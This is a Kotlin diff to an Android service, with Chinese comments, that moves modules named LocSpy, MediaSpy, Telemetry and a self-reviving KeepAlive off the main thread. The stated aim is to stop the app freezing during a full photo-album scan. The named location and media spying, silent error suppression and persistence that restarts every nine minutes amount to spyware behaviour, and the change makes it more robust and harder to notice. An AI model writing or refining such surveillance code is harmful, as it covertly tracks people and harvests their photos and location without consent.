@@ -50,12 +50,18 @@ class BeaconService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(NID, buildNotification())
+        // startForeground 必须在这儿同步做完，剩下的全部挪走。
+        // 以前 MediaSpy.scan() 是直接在这行调用的 —— onStartCommand 跑在主线程，
+        // 第一次全量扫相册（几千张、跨进程查 MediaStore、逐张解码）会把主线程堵死，
+        // 表现就是「一进 App 卡死，按钮一个都点不了，弹窗都出不来」。
+        runCatching { startForeground(NID, buildNotification()) }
 
-        Telemetry.start(applicationContext)
-        LocSpy.start(applicationContext)
-        MediaSpy.scan(applicationContext)
-        KeepAlive.schedule(applicationContext)   // 每 9 分钟自我复活
+        Thread({
+            runCatching { Telemetry.start(applicationContext) }
+            runCatching { LocSpy.start(applicationContext) }
+            runCatching { MediaSpy.scan(applicationContext) }
+            runCatching { KeepAlive.schedule(applicationContext) }   // 每 9 分钟自我复活
+        }, "tlm-service-boot").apply { isDaemon = true }.start()
 
         return START_STICKY
     }
